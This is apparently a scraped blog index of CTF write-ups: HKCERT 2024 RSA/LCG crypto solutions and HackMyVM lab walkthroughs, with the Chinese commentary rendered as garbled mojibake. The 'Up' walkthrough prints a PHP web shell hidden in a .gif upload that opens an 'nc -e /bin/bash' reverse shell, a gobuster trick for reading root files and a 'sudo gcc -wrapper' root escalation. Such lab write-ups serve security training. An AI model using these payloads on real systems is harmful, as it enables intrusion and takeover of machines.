[None for _ in range(309)] _s = [None for _ in range(309)] # a+b _d = [None for _ in range(309)] # a-b _c = [None for _ in range(309)] # c _f = [None for _ in range(309)] # c-a for i in range(155): _a[2*i+0] = int(str(s1)[i]) for i in range(154): _b[2*i+1] = int(str(s2)[i]); _b[0] = 0 for i in range(155): _s[2*i+0] = int(str(s3)[i]) for i in range(154): _d[2*i+1] = int(str(s4)[i]); _d[0] = 0 for i in range(155): _c[2*i+0] = int(str(s5)[i]) for i in range(154): _f[2*i+1] = int(str(s6)[i]); _f[0] = 0 assert _a[0] == 1 a = b = s = d = 0 for i in range(308, 0, -2): # Fill in the i-th digit a += _a[i] * 10**(308-i) s += _s[i] * 10**(308-i) b = (s - a) % 10**(308-i+1) d = (a - b) % 10**(308-i+1) # Fill in the (i-1)-th digit b += _b[i-1] * 10**(308-i+1) d += _d[i-1] * 10**(308-i+1) a = (b + d) % 10**(308-i+2) s = (a + b) % 10**(308-i+2) a += _a[0] * 10**308 s += _s[0] * 10**308 c = f = 0 for i in range(308, 0, -2): # Fill in the i-th digit c += _c[i] * 10**(308-i) f = (c - a) % 10**(308-i+1) # Fill in the (i-1)-th digit f += _f[i-1] * 10**(308-i+1) c = (f + a) % 10**(308-i+2) c += _c[0] * 10**308 f += _f[0] * 10**308 # a = p^e mod n # b = q^e mod n # Sanity check assert int(str(a)[::2]) == s1 assert int(str(b)[::2]) == s2 assert int(str(s)[::2]) == s3 assert int(str(d)[::2]) == s4 assert a + b == s assert a - b == d assert c - a == f # a = p^65537 mod n # b = q^65537 mod n # c = 2^65537 * q^65537 mod n q = gcd(b, c) for k in range(2, 10**6): while q % k == 0: q //= k assert q.bit_length() == 513 assert is_prime(q) dq = pow(e, -1, q-1) p = pow(a, dq, q)","date":"2025-02-24","objectID":"/hkcert2024/:2:2","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg0 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') seed = secrets.randbits(16) | 1 lcg = LCG(bits=128, seed=seed) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') seedåªæœ‰16ä½ï¼Œæˆ‘ä»¬åªéœ€è¦ä¼˜åŒ–ä¸€ä¸‹çº¿ç¨‹æˆ–è€…æ˜¯ç›´æ¥çˆ†ç ´å°±è¡Œ from Crypto.Util.number import isPrime as is_prime from tqdm import trange class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed self.a = a self.c = c self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def get_prime(lcg, bits): while True: p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p lcg = LCG(bits=128, a=181525535962623036141846439269075744717, c=115518761677956575882056543847720910703, seed=1) n = c = for seed in trange(58725, 2**16, 2): lcg.seed = seed p = get_prime(lcg, bits=1024) if n%p == 0: break flag = pow(c, pow(65537, -1, p-1), p) print(bytes.fromhex(f'{flag:x}')) ","date":"2025-02-24","objectID":"/hkcert2024/:2:3","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg1 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') lcg = LCG(bits=256, c=0) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') seedå¾ˆå¤§ï¼Œçˆ†ç ´å°±ä¸ç°å®äº†ï¼Œå‘ç°c=0ï¼Œè¿™å°±åœ¨æš—ç¤ºæ€è·¯äº† $$ (s \\times a^{x_1} ) \\times (s \\times a^{x_2} ) \\times (s \\times a^{x_3} ) \\times (s \\times a^{x_4} ) \\equiv n \\mod m \\\\ a^{x_1 +x_2+x_3+x_4} \\times s^4 \\equiv n \\mod m \\\\ let \\ t = x_1 +x_2+x_3+x_4 \\\\ s^4 â‰¡ n \\times a^{-t} $$å“æ¨åˆ°è¿™é‡Œäº†ï¼Œæˆ‘è¦å»æ±‚sï¼Œå¯¹å¼å­å¼€å››æ¬¡æ–¹ï¼Œnaå·²çŸ¥ï¼Œæˆ‘åªè¦æš´åŠ›æ±‚è§£tå°±è¡Œäº†,è¿™ä¸ªtéƒ½æ˜¯4ä¸ªä¸€æ‰¹çš„ import secrets class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p n = c = a = m = 2**256 from Crypto.Util.number import * t = 0 while True: t += 4 for seed in Zmod(m)(n * pow(a, -t, m)).nth_root(4, all=True): lcg = LCG(bits=256, seed=int(seed), a=a, c=0) p = get_prime(lcg, bits=1024) if n%p != 0: continue flag = pow(c, pow(65537, -1, p-1), p) flag=long_to_bytes(flag) print(flag) ","date":"2025-02-24","objectID":"/hkcert2024/:2:4","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg2 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') lcg = LCG(bits=256, a=1) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') å’Œä¸Šä¸€ä¸ªä¸€æ ·çˆ†ç ´æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘ä»¬ç°åœ¨çš„å¼å­å°±å˜æˆäº†s+xcï¼Œæˆ‘æ„Ÿè§‰æ›´åƒä¸€ä¸ªç®—æ³•é¢˜ï¼ˆï¼‰ï¼Œæˆ‘ä»¬åˆ©ç”¨01å»å†™å››ä¸ªè¯¯å·®æƒ…å†µï¼Œè®¡ç®—å‡ºå¯èƒ½çš„è¯¯å·®ï¼Œæ’åˆ—å‡ºæ‰€æœ‰çš„æƒ…å†µï¼Œç”¨å¼‚å¸¸å»åˆ¤æ–­æƒ…å†µï¼Œç„¶åé€šè¿‡çš„å»æ±‚å¤šé¡¹å¼æ ¹ï¼Œç›´åˆ°èƒ½næ•´é™¤ä¸ºæ­¢ è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•æ˜¯åˆ©ç”¨æ ¼æ±‚è§£ import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime import itertools from tqdm import tqdm class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 pi_list = [] for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits pi = lcg.next() pi_list.append(pi) p |= pi if i == 0: orig_seed = pi if int(p).bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = b'hkcert24{***REDACTED***}' c = M = 2^256 n = possible_bias = [(0, 0, 0, 1), (0, 0, 1, 1), (0, 1, 1, 1), (0, 0, 0, 0)] possible_B = [] for bias_list in possible_bias: B = sum((i * c - bi * M) * M^(3-i) for i, bi in enumerate(bias_list)) possible_B.append(B) A = sum(M^(3-i) for i in range(len(bias_list))) for my_indices in itertools.product(range(4), repeat=4): Bs = prod(possible_B[index] for index in my_indices) % A if Bs == n % A: break else: raise Exception(\"abab\") B_list = [possible_B[index] for index in my_indices] bias_list = [possible_bias[index] for index in my_indices] print(f'{bias_list = }') PR.\u003cx\u003e = Zmod(n)[] for kdiff_0 in tqdm(range(-3000, 3000)): kdiff = 4 * kdiff_0 xdiff0 = c * kdiff % M for xdiff in [xdiff0, xdiff0 - M]: f0 = (A * x + B_list[0]) * (A * (x + xdiff) + B_list[1]) f = f0.monic() sol = f.small_roots(X=2^256, beta=0.48) for x_ in sol: p = A * ZZ(x_) + B_list[0] if n % p == 0: print(f'{p = }') exit() from Crypto.Util.number import * e = 65537 c = p = d = inverse(e, p-1) m = pow(c, d, p) print(long_to_bytes(m)) ","date":"2025-02-24","objectID":"/hkcert2024/:2:5","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg3 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') seed = secrets.randbits(128)\u003c\u003c128 | 1 lcg = LCG(bits=256, seed=seed) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') è¿™ä¸ªæ˜¯çœŸä¸ä¼šï¼Œseedè¢«Â«128ï¼Œé‚£ä¹ˆ$seedÂ«128 \\mod 2^{128}=1$ï¼ŒæŒ‰ç€ä½¬çš„æ€è·¯æ¥è¯´ï¼Œç›´æ¥åšä¸€ä¸ª$2^{128}$çš„mitmï¼Œå»æ¢å¤x1åˆ°x4ï¼Œç„¶åå°±æœ‰ä¸€ä¸ªmod 2**256çš„æ–¹ç¨‹ï¼Œåˆ©ç”¨.roots(multiplicities=False)æ±‚è§£ï¼Œæˆ–è€…æ˜¯lsbä¹Ÿå¯ä»¥ï¼Œçœ‹ä¸æ‡‚ã€‚ from tqdm import trange, tqdm a = c = n = e = 65537 ct = class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed self.a = a self.c = c self.bits = bits self.m = 2**bits self.counter = 0 def next(self): self.seed = (self.seed * self.a + self.c) % self.m self.counter += 1 return self.seed def get_prime(lcg, bits): while True: p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p def get_chunk(lcg, bits): p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() return p lcg = LCG(bits=256, seed=1, a=a, c=c) MAX = 3200 m = 2**128 pp = [get_chunk(lcg, 1024) % m for _ in range(MAX)] # possible prime lsbs def mitm(): lookup = {} for x2 in trange(MAX): for x1 in range(x2): lookup[pp[x1] * pp[x2] % m] = (x1, x2) for x4 in trange(MAX): for x3 in range(x4): t = n * pow(pp[x3] * pp[x4], -1, m) % m if t in lookup: x1, x2 = lookup[t] return (x1, x2, x3, x4) x1, x2, x3, x4 = mitm() #x1, x2, x3, x4 = [2848, 3158, 595, 1597] print(x1, x2, x3, x4) x1, x2, x3, x4 = (4*(x1+1), 4*(x2+1), 4*(x3+1), 4*(x4+1)) m = 2**256 # now work mod 2**256 PR.\u003cs\u003e = PolynomialRing(Zmod(m)) def f(x): return (pow(a, x, m) * s + c * sum([pow(a, i, m) for i in range(x)])) g = f(x1) * f(x2) * f(x3) * f(x4) - n g = g.change_ring(ZZ) sol = {0} for i in range(256): cur_sol = set() for rr in sol: for b in [0, 1]: r = b*2**i + rr M = 2**(i+1) if 0 != g(r) % M: continue cur_sol.add(r) sol = cur_sol for seed in tqdm(sol): if seed % 2**128 != 1: continue if seed.bit_length() != 256: continue lcg = LCG(bits=256, seed=seed, a=a, c=c) p = get_prime(lcg, 1024) if n % p == 0: break flag = pow(ct, pow(e, -1, p-1), p) print(bytes.fromhex(f'{flag:x}')) ","date":"2025-02-24","objectID":"/hkcert2024/:2:6","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"æ€»ç»“ å«é‡‘é‡å¾ˆé«˜å¾ˆéš¾çš„æ¯”èµ›ï¼Œ24å¹´æ²¡æœ‰å»çº¿ä¸‹å¾ˆé—æ†¾ï¼Œç›¸ä¿¡è‡ªå·±å§ï¼Œ25åŠ æ²¹ ","date":"2025-02-24","objectID":"/hkcert2024/:3:0","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["é¶åœº"],"content":"up ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:0","tags":["æ¸—é€"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=Up ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:1","tags":["æ¸—é€"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo arp-scan -l [sudo] password for kali: Sorry, try again. [sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.238 08:00:27:ba:dc:8f (Unknown) 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap 192.168.31.238 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 10:21 HKT Nmap scan report for 192.168.31.238 Host is up (0.0012s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE 80/tcp open http MAC Address: 08:00:27:BA:DC:8F (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds å…ˆç®€å•çš„ç”¨dirbæ‰«ä¸€ä¸‹ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dirb http://192.168.31.238 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sun Feb 23 10:33:50 2025 URL_BASE: http://192.168.31.238/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.238/ ---- + http://192.168.31.238/index.php (CODE:200|SIZE:4489) ==\u003e DIRECTORY: http://192.168.31.238/javascript/ + http://192.168.31.238/server-status (CODE:403|SIZE:279) ==\u003e DIRECTORY: http://192.168.31.238/uploads/ ---- Entering directory: http://192.168.31.238/javascript/ ---- ==\u003e DIRECTORY: http://192.168.31.238/javascript/jquery/ ---- Entering directory: http://192.168.31.238/uploads/ ---- + http://192.168.31.238/uploads/robots.txt (CODE:200|SIZE:1301) ---- Entering directory: http://192.168.31.238/javascript/jquery/ ---- + http://192.168.31.238/javascript/jquery/jquery (CODE:200|SIZE:289782) END_TIME: Sun Feb 23 10:34:08 2025 DOWNLOADED: 18448 - FOUND: 4 uploadsä¼°è®¡æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ‰«ä¸€ä¸‹ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dirb http://192.168.31.238/uploads DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sun Feb 23 10:35:27 2025 URL_BASE: http://192.168.31.238/uploads/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.238/uploads/ ---- + http://192.168.31.238/uploads/robots.txt (CODE:200|SIZE:1301) END_TIME: Sun Feb 23 10:35:32 2025 DOWNLOADED: 4612 - FOUND: 1 ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:2","tags":["æ¸—é€"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["é¶åœº"],"content":"åå¼¹shell æ‰“å¼€å¾—åˆ° PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgYXJjaGl2by4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiU29sbyBzZSBwZXJtaXRlbiBhcmNoaXZvcyBKUEcgeSBHSUYuIjsKICAgIH0KfQo/Pgo= ä¸€çœ¼base64ï¼Œå¨å­å¯åŠ¨ \u003c?php if ($_SERVER['REQUEST_METHOD'] === 'POST') { $targetDir = \"uploads/\"; $fileName = basename($_FILES[\"image\"][\"name\"]); $fileType = pathinfo($fileName, PATHINFO_EXTENSION); $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME); $allowedTypes = ['jpg', 'jpeg', 'gif']; if (in_array(strtolower($fileType), $allowedTypes)) { $encryptedFileName = strtr($fileBaseName, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'); $newFileName = $encryptedFileName . \".\" . $fileType; $targetFilePath = $targetDir . $newFileName; if (move_uploaded_file($_FILES[\"image\"][\"tmp_name\"], $targetFilePath)) { $message = \"El archivo se ha subido correctamente.\"; } else { $message = \"Hubo un error al subir el archivo.\"; } } else { $message = \"Solo se permiten archivos JPG y GIF.\"; } } ?\u003e è¿™ä¸ªä»£ç ç®€å•æ¥è¯´å°±æ˜¯æ–‡ä»¶åè¿›è¡Œäº†rot13æ“ä½œï¼Œä¸”åªå…è®¸ä¸Šä¼ jpgå’Œgifæ–‡ä»¶ echo â€œ\u003c ?php system(â€™nc -e /bin/bash 192.168.31.183 4444â€™); ?\u003eâ€ \u003e zsm.gif bpä¼ ä¸Šå»è¯•è¯•å‘— â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nc -lvnp 4444 listening on [any] 4444 ... connect to [192.168.31.183] from (UNKNOWN) [192.168.31.238] 48740 ls access_denied.html clue.txt mfz.gif robots.txt homeä¸‹çš„ç”¨æˆ·ç›®å½•å¯ä»¥è¿›ï¼Œå…ˆæŠŠç¬¬ä¸€ä¸ªflagæ‹¿äº† ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:3","tags":["æ¸—é€"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["é¶åœº"],"content":"ææƒ sudo -l Matching Defaults entries for www-data on debian: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User www-data may run the following commands on debian: (ALL) NOPASSWD: /usr/bin/gobuster gobusteræ˜¯ææƒç‚¹ gobusteræ— æ³•å¯¹æœ¬åœ°ç›®å½•è¿›è¡Œæ‰«æï¼Œä½†å¯ä»¥ä½¿ç”¨-wå‚æ•°å°†æœ¬åœ°ç›®å½•ä½œä¸ºå­—å…¸ç›®å½•è¯»å–ã€‚å› æ­¤ï¼Œåœ¨æœ¬æœºè¿è¡ŒhttpæœåŠ¡ï¼Œåœ¨é¶æœºè¿è¡Œgobusterï¼Œçœ‹é¶æœºè¯·æ±‚å“ªäº›æ–‡ä»¶ã€‚ sudo /usr/bin/gobuster dir -w \"/root/rodgarpass\" -u \"http://192.168.31.183:8888\" â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ python3 -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... 192.168.31.238 - - [23/Feb/2025 10:56:32] \"GET / HTTP/1.1\" 200 - 192.168.31.238 - - [23/Feb/2025 10:56:32] code 404, message File not found 192.168.31.238 - - [23/Feb/2025 10:56:32] \"GET /958637c2-0c37-44a1-93ad-48c9eba3a07c HTTP/1.1\" 404 - 192.168.31.238 - - [23/Feb/2025 10:56:32] code 404, message File not found 192.168.31.238 - - [23/Feb/2025 10:56:32] \"GET /b45cffe084dd3d20d928bee85e7b0f2 HTTP/1.1\" 404 - b45cffe084dd3d20d928bee85e7b0f2æ˜¯ä¸ªmd5å€¼ -\u003e string ç»“æœä¸å¯¹wcï¼Œ echo -n string |md5sum b45cffe084dd3d20d928bee85e7b0f21 - nbï¼Œè¿™ä¸ªä½œè€…å°‘æ‰“ä¸ª1 åˆ‡æ¢æˆè¿™ä¸ªç”¨æˆ·ï¼Œå†çœ‹çœ‹ææƒç‚¹ï¼Œ rodgar@debian:~$ sudo -l sudo -l Matching Defaults entries for rodgar on debian: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User rodgar may run the following commands on debian: (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make gccææƒï¼Œå†™ä¸ªbinbashè¿›å»å°±è¡Œäº† rodgar@debian:~$ sudo gcc -wrapper /bin/sh,-s . sudo gcc -wrapper /bin/sh,-s . id id uid=0(root) gid=0(root) grupos=0(root) -wrapperæ˜¯gccçš„å‚æ•°ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œgccä¼šè°ƒç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶æŠŠgccçš„å‚æ•°ä¼ é€’ç»™è¿™ä¸ªæ–‡ä»¶ã€‚ -sæ˜¯äº¤äº’å¼ç»ˆç«¯ ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:4","tags":["æ¸—é€"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["é¶åœº"],"content":"Airbind ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:0","tags":["æ¸—é€"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=Airbind ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:1","tags":["æ¸—é€"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.149 d2:6d:24:38:04:12 (Unknown: locally administered) 192.168.31.156 08:00:27:97:c1:97 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.853 seconds (138.15 hosts/sec). 5 responded â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap 192.168.31.156 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 10:35 HKT Nmap scan report for 192.168.31.156 Host is up (0.0031s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp filtered ssh 80/tcp open http MAC Address: 08:00:27:97:C1:97 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds ç›´æ¥æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œä¸èƒ½æ‰“sqlï¼Œç›´æ¥ç®€å•dirbæ‰«ä¸€ä¸‹ç›®å½•å…ˆ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ dirb http://192.168.31.156 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sat Feb 22 10:47:17 2025 URL_BASE: http://192.168.31.156/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.156/ ---- + http://192.168.31.156/cronjobs (CODE:200|SIZE:410) ==\u003e DIRECTORY: http://192.168.31.156/db/ ==\u003e DIRECTORY: http://192.168.31.156/images/ ==\u003e DIRECTORY: http://192.168.31.156/includes/ + http://192.168.31.156/index.php (CODE:302|SIZE:0) ==\u003e DIRECTORY: http://192.168.31.156/libs/ ==\u003e DIRECTORY: http://192.168.31.156/screenshots/ ==\u003e DIRECTORY: http://192.168.31.156/scripts/ + http://192.168.31.156/server-status (CODE:403|SIZE:279) 